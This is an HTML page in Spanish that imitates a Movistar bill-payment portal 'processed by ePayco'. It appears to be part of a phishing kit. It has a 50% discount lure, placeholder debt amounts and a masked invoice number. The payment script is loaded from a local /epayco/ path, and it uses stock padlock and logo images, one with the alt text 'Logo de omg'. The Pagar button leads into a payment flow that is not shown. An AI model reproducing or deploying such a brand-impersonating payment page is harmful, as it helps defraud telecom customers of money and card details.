
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="description"
        content="Portal de recaudos Movistar, paga o programa tus facturas de forma fácil y rápida" />
    <meta name="theme-color" content="#019DF4" />
    <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon" />

    <!-- Stylesheets -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
    <link href="styles.css" rel="stylesheet" />
    <!-- Enlace al CSS separado -->
    
    <title>Movistar Portal de Recaudos</title>
    <script src="/epayco/js/functions.js"></script>
</head>

<body>

    <!-- Spinner -->
    <div id="spinnerOverlay" class="spinner-overlay d-none">
        <div class="spinner-border" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>

    <header class="header">
        <img src="img/descarga.png" alt="Encabezado de Movistar" class="header-image" />
        <div class="header-footer-text d-md-none">
            <!-- Duplicated element for mobile view -->
            <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png"
                alt="Ícono de candado" class="lock-icon" />
            <span>Pagos procesados por
                <img src="img/logo_ePayco.1722863467828.png" alt="Logo de omg" class="omg-logo" /></span>
        </div>
    </header>

    <div class="container text-center mt-5">
        <div class="row justify-content-center align-items-center">
            <div class="col-md-6 d-flex align-items-center">
                <img src="img/total.svg" alt="Imagen" class="img-fluid me-3" />
                <!-- Añadido "me-3" para margen derecho -->
                <div>
                    <div class="numero-linea">
                        Número de línea: <span id="line-number-display"></span>
                    </div>
                    <!-- Añadido texto adicional centrado -->
                    <div class="text-center mt-3">
                        
                        <p class="info-title">Información de tu factura</p>
                        <p class="invoice-number">Factura No. ********</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    

    <!-- Botón ovalado pequeño -->
    <div class="text-center mt-4">
        <button class="btn btn-primary px-3 py-1 rounded-pill" style="font-size: 0.875rem; width: 85vw;">
            Agregar otro número de línea u otra referencia de pago
        </button>
    </div>

    <!-- Contenedor con línea y texto sobre la línea -->
    <div class="container mt-4 position-relative">
        <!-- Texto y círculo sobre la línea -->
        <div class="row justify-content-between align-items-center mb-2 position-relative">
            <div class="col-auto d-flex align-items-center">
                <div class="rounded-circle bg-primary d-flex justify-content-center align-items-center"
                    style="width: 18px; height: 18px; color: white">
                    ✔
                </div>
                <span class="ms-2" style="color: darkgray;">Total deuda</span>
            </div>
            <div class="col-auto">
                <strong style="color: darkgray;">$ <span id="debt">100</span></strong>
                <!-- Cambia el valor a lo que necesites -->
            </div>
            
        </div>
        <div class="row justify-content-between align-items-center mb-2 position-relative">
            <div class="col-auto d-flex align-items-center">
                <div class="rounded-circle bg-primary d-flex justify-content-center align-items-center"
                    style="width: 18px; height: 18px; color: white">
                    ✔
                </div>
                <span style="color: gray;" class="ms-2">Descuento 50%</span>
                

            </div>
            <div class="col-auto">
                <strong style="color: gray;" >$ <span id="desc">100</span></strong>
                <!-- Cambia el valor a lo que necesites -->
            </div>
        
        </div>

        <div class="row justify-content-between align-items-center mb-2 position-relative">
            <div class="col-auto d-flex align-items-center">
                <div class="rounded-circle bg-primary d-flex justify-content-center align-items-center"
                    style="width: 18px; height: 18px; color: white">
                    ✔
                </div>
                <span class="ms-2">Total a pagar</span>
            </div>
            <div class="col-auto">
                <strong>$ <span id="total">100</span></strong>
                <!-- Cambia el valor a lo que necesites -->
            </div>
        
        </div>


        <!-- Línea debajo del texto con color y estilo actualizado -->
        <div class="border-top position-relative" style="
          border-color: rgb(11, 39, 57);
          border-width: 2px;
          border-style: solid;
        "></div>
    </div>

  
    <!-- Botones de acción -->
    <div class="container text-center mt-4">
        <div class="row justify-content-center">
            <div class="col-auto">
                <button class="btn btn-outline-primary px-5 py-2 rounded-pill" id="cancelButton"
                    style="border-color: rgb(11, 39, 57); color: rgb(11, 39, 57)">
                    Cancelar
                </button>
            </div>
            <div class="col-auto ms-2">
                <button class="btn btn-primary px-5 py-2 rounded-pill" id="payButton"
                    style="background-color: rgb(11, 39, 57); color: white">
                    Pagar
                </button>
            </div>
        </div>
    </div>
    

    <script>
        document.getElementById("cancelButton").addEventListener("click", function () {
            window.location.href = "index.html";
        });
    </script>
    <br>
    <!-- Pie de página -->
    <div class="container rounded-square">
        <p>Envía <span>FACTURA</span> como mensaje de texto al 85202 desde tu línea <span>Movistar</span> y conoce el <span>detalle de tu pago</span></p>
    </div>
